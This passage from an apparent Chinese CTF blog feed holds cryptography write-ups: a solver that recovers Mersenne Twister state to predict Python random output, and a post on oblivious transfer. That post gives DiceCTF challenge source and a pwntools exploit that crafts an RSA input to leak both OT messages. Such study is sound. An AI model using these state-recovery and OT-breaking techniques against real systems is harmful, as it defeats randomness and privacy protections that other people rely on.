class="number">58</span>, <span class="number">249</span>, <span class="number">167</span>, <span class="number">217</span>, <span class="number">174</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">56</span>, <span class="number">181</span>, <span class="number">212</span>, <span class="number">42</span>, <span class="number">188</span>, <span class="number">6</span>, <span class="number">117</span>, <span class="number">93</span>, <span class="number">178</span>, <span class="number">160</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">150</span>, <span class="number">207</span>, <span class="number">245</span>, <span class="number">227</span>, <span class="number">247</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">114</span>, <span class="number">204</span>, <span class="number">101</span>, <span class="number">176</span>, <span class="number">55</span>, <span class="number">43</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">90</span>, <span class="number">124</span>, <span class="number">45</span>, <span class="number">96</span>, <span class="number">181</span>, <span class="number">221</span>, <span class="number">16</span>, <span class="number">121</span>, <span class="number">210</span>, <span class="number">51</span>, <span class="number">210</span>, <span class="number">164</span>, <span class="number">68</span>, <span class="number">64</span>, <span class="number">154</span>, <span class="number">167</span>, <span class="number">91</span>, <span class="number">69</span>, <span class="number">35</span>, <span class="number">153</span>, <span class="number">212</span>, <span class="number">10</span>, <span class="number">125</span>, <span class="number">235</span>, <span class="number">203</span>, <span class="number">166</span>, <span class="number">145</span>, <span class="number">9</span>, <span class="number">174</span>, <span class="number">86</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">112</span>, <span class="number">194</span>, <span class="number">140</span>, <span class="number">92</span>, <span class="number">170</span>, <span class="number">49</span>, <span class="number">191</span>, <span class="number">157</span>, <span class="number">218</span>, <span class="number">199</span>, <span class="number">152</span>, <span class="number">151</span>, <span class="number">247</span>, <span class="number">208</span>, <span class="number">182</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">245</span>, <span class="number">5</span>, <span class="number">173</span>, <span class="number">105</span>, <span class="number">175</span>, <span class="number">159</span>, <span class="number">71</span>, <span class="number">251</span>, <span class="number">198</span>, <span class="number">246</span>, <span class="number">214</span>, <span class="number">99</span>, <span class="number">58</span>, <span class="number">70</span>, <span class="number">154</span>, <span class="number">52</span>, <span class="number">39</span>, <span class="number">88</span>, <span class="number">149</span>, <span class="number">179</span>, <span class="number">202</span>, <span class="number">86</span>, <span class="number">240</span>, <span class="number">108</span>, <span class="number">200</span>, <span class="number">83</span>, <span class="number">250</span>, <span class="number">62</span>, <span class="number">213</span>, <span class="number">113</span>, <span class="number">138</span>, <span class="number">73</span>, <span class="number">106</span>, <span class="number">141</span>, <span class="number">192</span>, <span class="number">204</span>, <span class="number">90</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">28</span>, <span class="number">124</span>, <span class="number">30</span>, <span class="number">134</span>, <span class="number">119</span>, <span class="number">144</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">204</span>, <span class="number">181</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">156</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">104</span>, <span class="number">186</span>, <span class="number">87</span>, <span class="number">221</span>, <span class="number">134</span>, <span class="number">122</span>, <span class="number">72</span>, <span class="number">244</span>, <span class="number">203</span>, <span class="number">121</span>, <span class="number">181</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">185</span>, <span class="number">131</span>, <span class="number">230</span>, <span class="number">133</span>, <span class="number">54</span>, <span class="number">158</span>, <span class="number">186</span>, <span class="number">168</span>, <span class="number">201</span>, <span class="number">178</span>, <span class="number">155</span>, <span class="number">172</span>, <span class="number">164</span>, <span class="number">22</span>, <span class="number">130</span>, <span class="number">111</span>, <span class="number">90</span>, <span class="number">209</span>, <span class="number">2</span>, <span class="number">167</span>, <span class="number">23</span>, <span class="number">176</span>, <span class="number">63</span>, <span class="number">139</span>, <span class="number">89</span>, <span class="number">63</span>, <span class="number">15</span>, <span class="number">238</span>, <span class="number">110</span>, <span class="number">204</span>, <span class="number">85</span>, <span class="number">36</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">240</span>, <span class="number">177</span>, <span class="number">31</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">147</span>, <span class="number">205</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">173</span>, <span class="number">103</span>, <span class="number">130</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">232</span>, <span class="number">125</span>, <span class="number">216</span>, <span class="number">163</span>, <span class="number">209</span>, <span class="number">171</span>, <span class="number">168</span>, <span class="number">243</span>, <span class="number">145</span>, <span class="number">6</span>, <span class="number">170</span>, <span class="number">41</span>, <span class="number">142</span>, <span class="number">250</span>, <span class="number">145</span>, <span class="number">57</span>, <span class="number">139</span>, <span class="number">224</span>, <span class="number">221</span>, <span class="number">189</span>, <span class="number">48</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">92</span>, <span class="number">216</span>, <span class="number">154</span>, <span class="number">126</span>, <span class="number">223</span>, <span class="number">8</span>, <span class="number">90</span>, <span class="number">82</span>, <span class="number">138</span>, <span class="number">221</span>, <span class="number">240</span>, <span class="number">223</span>, <span class="number">87</span>, <span class="number">209</span>, <span class="number">165</span>, <span class="number">17</span>, <span class="number">52</span>, <span class="number">154</span>, <span class="number">91</span>, <span class="number">12</span>, <span class="number">121</span>, <span class="number">212</span>, <span class="number">238</span>, <span class="number">46</span>, <span class="number">215</span>, <span class="number">217</span>, <span class="number">147</span>, <span class="number">136</span>, <span class="number">139</span>, <span class="number">251</span>, <span class="number">91</span>, <span class="number">39</span>, <span class="number">188</span>, <span class="number">244</span>, <span class="number">251</span>, <span class="number">52</span>, <span class="number">110</span>, <span class="number">22</span>, <span class="number">126</span>, <span class="number">200</span>, <span class="number">231</span>, <span class="number">153</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">120</span>, <span class="number">219</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">141</span>, <span class="number">203</span>, <span class="number">75</span>, <span class="number">163</span>, <span class="number">150</span>, <span class="number">194</span>, <span class="number">27</span>, <span class="number">208</span>, <span class="number">9</span>, <span class="number">186</span>, <span class="number">6</span>, <span class="number">85</span>, <span class="number">46</span>, <span class="number">243</span>, <span class="number">135</span>, <span class="number">66</span>, <span class="number">40</span>, <span class="number">79</span>, <span class="number">206</span>, <span class="number">250</span>, <span class="number">20</span>, <span class="number">85</span>, <span class="number">123</span>, <span class="number">35</span>, <span class="number">164</span>, <span class="number">44</span>, <span class="number">85</span>, <span class="number">104</span>, <span class="number">66</span>, <span class="number">51</span>, <span class="number">177</span>, <span class="number">125</span>, <span class="number">189</span>, <span class="number">165</span>, <span class="number">226</span>, <span class="number">13</span>, <span class="number">75</span>, <span class="number">78</span>, <span class="number">225</span>, <span class="number">252</span>, <span class="number">226</span>, <span class="number">138</span>, <span class="number">81</span>, <span class="number">171</span>, <span class="number">172</span>, <span class="number">175</span>, <span class="number">122</span>, <span class="number">145</span>, <span class="number">68</span>, <span class="number">254</span>, <span class="number">37</span>, <span class="number">153</span>, <span class="number">39</span>, <span class="number">113</span>, <span class="number">237</span>, <span class="number">232</span>, <span class="number">220</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">181</span>, <span class="number">21</span>, <span class="number">197</span>, <span class="number">186</span>, <span class="number">56</span>, <span class="number">202</span>, <span class="number">239</span>, <span class="number">213</span>, <span class="number">135</span>, <span class="number">41</span>, <span class="number">6</span>, <span class="number">85</span>, <span class="number">54</span>, <span class="number">135</span>, <span class="number">214</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">153</span>, <span class="number">235</span>, <span class="number">110</span>, <span class="number">26</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">220</span>, <span class="number">142</span>, <span class="number">236</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">117</span>, <span class="number">205</span>, <span class="number">249</span>, <span class="number">92</span>, <span class="number">148</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">235</span>, <span class="number">205</span>, <span class="number">232</span>, <span class="number">21</span>, <span class="number">48</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">124</span>, <span class="number">218</span>, <span class="number">166</span>, <span class="number">155</span>, <span class="number">183</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">123</span>, <span class="number">53</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">101</span>, <span class="number">193</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">39</span>, <span class="number">99</span>, <span class="number">22</span>, <span class="number">197</span>, <span class="number">75</span>, <span class="number">10</span>, <span class="number">165</span>, <span class="number">44</span>, <span class="number">215</span>, <span class="number">210</span>, <span class="number">181</span>, <span class="number">74</span>, <span class="number">235</span>, <span class="number">200</span>, <span class="number">247</span>, <span class="number">158</span>, <span class="number">187</span>, <span class="number">200</span>, <span class="number">102</span>, <span class="number">22</span>, <span class="number">150</span>, <span class="number">73</span>, <span class="number">42</span>, <span class="number">131</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">180</span>, <span class="number">133</span>, <span class="number">205</span>, <span class="number">23</span>, <span class="number">228</span>, <span class="number">226</span>, <span class="number">219</span>, <span class="number">175</span>, <span class="number">207</span>, <span class="number">81</span>, <span class="number">53</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">140</span>, <span class="number">59</span>, <span class="number">218</span>, <span class="number">169</span>, <span class="number">7</span>, <span class="number">219</span>, <span class="number">139</span>, <span class="number">75</span>, <span class="number">210</span>, <span class="number">97</span>, <span class="number">236</span>, <span class="number">157</span>, <span class="number">21</span>, <span class="number">109</span>, <span class="number">195</span>, <span class="number">128</span>, <span class="number">54</span>, <span class="number">5</span>, <span class="number">55</span>, <span class="number">217</span>, <span class="number">127</span>, <span class="number">49</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">86</span>, <span class="number">255</span>, <span class="number">22</span>, <span class="number">186</span>, <span class="number">94</span>, <span class="number">151</span>, <span class="number">114</span>, <span class="number">93</span>, <span class="number">19</span>, <span class="number">198</span>, <span class="number">159</span>, <span class="number">174</span>, <span class="number">142</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">157</span>, <span class="number">206</span>, <span class="number">161</span>, <span class="number">107</span>, <span class="number">255</span>, <span class="number">106</span>, <span class="number">196</span>, <span class="number">250</span>, <span class="number">191</span>, <span class="number">86</span>, <span class="number">221</span>, <span class="number">196</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">50</span>, <span class="number">224</span>, <span class="number">42</span>, <span class="number">20</span>, <span class="number">89</span>, <span class="number">212</span>, <span class="number">252</span>, <span class="number">191</span>, <span class="number">157</span>, <span class="number">237</span>, <span class="number">10</span>, <span class="number">157</span>, <span class="number">80</span>, <span class="number">42</span>, <span class="number">234</span>, <span class="number">180</span>, <span class="number">1</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">239</span>, <span class="number">129</span>, <span class="number">14</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">66</span>, <span class="number">203</span>, <span class="number">120</span>, <span class="number">114</span>, <span class="number">37</span>, <span class="number">214</span>, <span class="number">37</span>, <span class="number">73</span>, <span class="number">153</span>, <span class="number">182</span>, <span class="number">165</span>, <span class="number">87</span>, <span class="number">177</span>, <span class="number">75</span>, <span class="number">220</span>, <span class="number">210</span>, <span class="number">105</span>, <span class="number">154</span>, <span class="number">149</span>, <span class="number">114</span>, <span class="number">13</span>, <span class="number">202</span>, <span class="number">128</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">96</span>, <span class="number">158</span>, <span class="number">150</span>, <span class="number">57</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">127</span>, <span class="number">160</span>, <span class="number">57</span>, <span class="number">80</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">241</span>, <span class="number">95</span>, <span class="number">121</span>, <span class="number">14</span>, <span class="number">110</span>, <span class="number">160</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">150</span>, <span class="number">156</span>, <span class="number">185</span>, <span class="number">158</span>, <span class="number">221</span>, <span class="number">110</span>, <span class="number">76</span>, <span class="number">255</span>, <span class="number">119</span>, <span class="number">15</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">238</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">250</span>, <span class="number">220</span>, <span class="number">147</span>, <span class="number">193</span>, <span class="number">51</span>, <span class="number">144</span>, <span class="number">123</span>, <span class="number">139</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">148</span>, <span class="number">251</span>, <span class="number">82</span>, <span class="number">227</span>, <span class="number">119</span>, <span class="number">92</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">248</span>, <span class="number">239</span>, <span class="number">217</span>, <span class="number">101</span>, <span class="number">88</span>, <span class="number">121</span>, <span class="number">10</span>, <span class="number">148</span>, <span class="number">203</span>, <span class="number">156</span>, <span class="number">156</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mt19937</span>(<span class="params">bs, out</span>):</span><br><span class="line"></span><br><span class="line">    lin = LinearSystem([<span class="number">32</span>] * <span class="number">624</span>)</span><br><span class="line">    mt = lin.gens()</span><br><span class="line"></span><br><span class="line">    rng = MT19937(mt)</span><br><span class="line">    rng.getrandbits(<span class="number">175</span>)</span><br><span class="line">    zeros = [rng.getrandbits(bs) ^ o <span class="keyword">for</span> o <span class="keyword">in</span> out] + [mt[<span class="number">0</span>] ^ <span class="number">0x80000000</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;solving...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sol = lin.solve_one(zeros)</span><br><span class="line"></span><br><span class="line">    rng = MT19937(sol)</span><br><span class="line">    pyrand = rng.to_python_random()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;solved&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(pyrand.getrandbits(<span class="number">175</span>)^enc))</span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">ans=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="built_in">len</span>(r)):</span><br><span class="line">    ans.append(<span class="number">255</span>-r[i])</span><br><span class="line">out=[]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(ans)==<span class="number">624</span>*<span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(ans[<span class="number">0</span>]))  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>*<span class="number">4</span>):</span><br><span class="line">    out.append(random.getrandbits(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(out[<span class="number">0</span>]))</span><br><span class="line">mt19937(<span class="number">8</span>,ans)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="6-prng-xxxx"><a href="#6-prng-xxxx" class="headerlink" title="6,prng_xxxx"></a>6,prng_xxxx</h1><p>咕咕</p>
]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>不经意传输</title>
    <url>/2025/03/31/%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/</url>
    <content><![CDATA[<p>owo</p>
<p>周末做到一道不经意传输的题，这也是个新知识点，总结学习一下。(ref:<a href="https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/">不经意传输 | Lazzaro</a>)</p>
<span id="more"></span>

<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>​		<strong>不经意传输（Oblivious Transfer, OT）</strong>是一种可保护隐私的双方通信协议、接受者的隐私不被发送者所知道，使通信双方以一种选择模糊化的方式传送消息。抽象地讲，就是A给B发消息，A却不知道B收到的是啥，一般的思路就是A要多发一些消息然后让B去选择有需要的，如果是这样的话，同时还应该保证B不会多知道他本不应该知道的消息。不经意传输可以分为1选1、2选1、n选1、n选k多种不经意传输协议。</p>
<p>对于2选一的攻击，重点是以下攻击方式</p>
<p><img src="https://ooo.0x0.ooo/2025/03/31/O0TVxx.png" alt="O0TVxx.png"></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line">	<span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	https://en.wikipedia.org/wiki/Oblivious_transfer#1–2_oblivious_transfer</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	x0 = secrets.randbelow(key.n)</span><br><span class="line">	x1 = secrets.randbelow(key.n)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">	v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line">	<span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">	k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">	k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">	m0 = <span class="built_in">int</span>.from_bytes(msg0.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">	m1 = <span class="built_in">int</span>.from_bytes(msg1.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">	c0 = (m0 + k0) % key.n</span><br><span class="line">	c1 = (m1 + k1) % key.n</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0&#125;</span>&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		flag = f.read().strip()</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Vorpal Sword Edition ===&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">		key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">		msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">		page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">		live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">		die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">		msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">		run_ot(key, *msgs)</span><br><span class="line">		page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line">		<span class="keyword">if</span> page_guess != page:</span><br><span class="line">			exit()</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>首先根据攻击方式构造v&#x3D;(scale^e * x0 - x1) &#x2F; (scale^e - 1) mod n，分析服务端脚本不难发现只有当我们知道的信息是live的时候才能得到正确的page通过guess、而die的死亡信息是已知的，那么思路就很明确了，遍历死亡消息，并尝试两种可能情况，die在m1，求解m0 &#x3D; (s + m1) &#x2F;&#x2F; scale或者die在m0，求解m1 &#x3D; scale$_<em>$m0 - s。值得注意的是，在die在m0，求解m1 &#x3D; scale</em>m0 - s这种情况中m1可能为负，此时要加上n保证值为正。最后循环猜64次即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">scale = random.getrandbits(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(scale)</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line">    <span class="string">&#x27;a fever&#x27;</span>, <span class="string">&#x27;dysentery&#x27;</span>, <span class="string">&#x27;measles&#x27;</span>, <span class="string">&#x27;cholera&#x27;</span>, <span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;exhaustion&#x27;</span>, <span class="string">&#x27;a snakebite&#x27;</span>, <span class="string">&#x27;a broken leg&#x27;</span>, <span class="string">&#x27;a broken arm&#x27;</span>, <span class="string">&#x27;drowning&#x27;</span></span><br><span class="line">]</span><br><span class="line">die_messages = [<span class="string">f&#x27;you die of <span class="subst">&#123;cause&#125;</span>.&#x27;</span> <span class="keyword">for</span> cause <span class="keyword">in</span> DEATH_CAUSES]</span><br><span class="line">die_ints = [<span class="built_in">int</span>.from_bytes(msg.encode(), <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> msg <span class="keyword">in</span> die_messages]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_page</span>(<span class="params">byte_data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从字节流中提取页码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded = byte_data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;turn to page (\d+)&#x27;</span>, decoded)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_round</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="comment"># 获取RSA参数和随机数x0, x1</span></span><br><span class="line">    conn.recvuntil(<span class="string">&#x27;n: &#x27;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(conn.recvline().strip())</span><br><span class="line">    conn.recvuntil(<span class="string">&#x27;e: &#x27;</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(conn.recvline().strip())</span><br><span class="line">    conn.recvuntil(<span class="string">&#x27;x0: &#x27;</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(conn.recvline().strip())</span><br><span class="line">    conn.recvuntil(<span class="string">&#x27;x1: &#x27;</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(conn.recvline().strip())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 正确构造v的表达式：(scale^e * x0 - x1) / (scale^e - 1) mod n</span></span><br><span class="line">    scale_e = <span class="built_in">pow</span>(scale, e, n)</span><br><span class="line">    denominator = (scale_e - <span class="number">1</span>) % n</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        inv_denominator = <span class="built_in">pow</span>(denominator, -<span class="number">1</span>, n)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 分母不可逆，概率极低</span></span><br><span class="line">    v = (scale_e * x0 - x1) * inv_denominator % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送v并获取密文c0, c1</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;v: &#x27;</span>, <span class="built_in">str</span>(v))</span><br><span class="line">    conn.recvuntil(<span class="string">&#x27;c0: &#x27;</span>)</span><br><span class="line">    c0 = <span class="built_in">int</span>(conn.recvline().strip())</span><br><span class="line">    conn.recvuntil(<span class="string">&#x27;c1: &#x27;</span>)</span><br><span class="line">    c1 = <span class="built_in">int</span>(conn.recvline().strip())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算s = scale*m0 - m1</span></span><br><span class="line">    s1=c0+c1</span><br><span class="line">    s = (scale * c0 - c1) % n</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历死亡消息，尝试两种可能情况</span></span><br><span class="line">    page = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 情况1：die在m1，求解m0 = (s + m1) // scale</span></span><br><span class="line">    <span class="keyword">for</span> die_m1 <span class="keyword">in</span> die_ints:</span><br><span class="line">        m0_candidate = (s + die_m1)</span><br><span class="line">        <span class="keyword">if</span> m0_candidate % scale != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        m0 = m0_candidate // scale</span><br><span class="line">        m0_bytes = m0.to_bytes(<span class="number">128</span>, <span class="string">&#x27;big&#x27;</span>).lstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        page = extract_page(m0_bytes)</span><br><span class="line">        <span class="keyword">if</span> page <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> page</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 情况2：die在m0，求解m1 = scale*m0 - s</span></span><br><span class="line">    <span class="keyword">for</span> die_m0 <span class="keyword">in</span> die_ints:</span><br><span class="line">        m1_candidate = (scale * die_m0 - s)</span><br><span class="line">        <span class="keyword">if</span> m1_candidate &lt; <span class="number">0</span>:</span><br><span class="line">            m1_candidate += n</span><br><span class="line">        m1_bytes = m1_candidate.to_bytes(<span class="number">128</span>, <span class="string">&#x27;big&#x27;</span>).lstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        page = extract_page(m1_bytes)</span><br><span class="line">        <span class="keyword">if</span> page <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> page</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page  <span class="comment"># 未找到页码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn = remote(<span class="string">&#x27;dicec.tf&#x27;</span>, <span class="number">31001</span>)  <span class="comment"># 替换为实际地址</span></span><br><span class="line">        conn.recvuntil(<span class="string">b&#x27;you enter a cave.\n&#x27;</span>)</span><br><span class="line">        kkk = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">            page = solve_round(conn)</span><br><span class="line">            <span class="built_in">print</span>(page)</span><br><span class="line">            conn.sendlineafter(<span class="string">b&#x27;turn to page: &#x27;</span>, <span class="built_in">str</span>(page).encode())</span><br><span class="line">            <span class="keyword">if</span> page <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(kkk, <span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">                conn.close()</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            kkk += <span 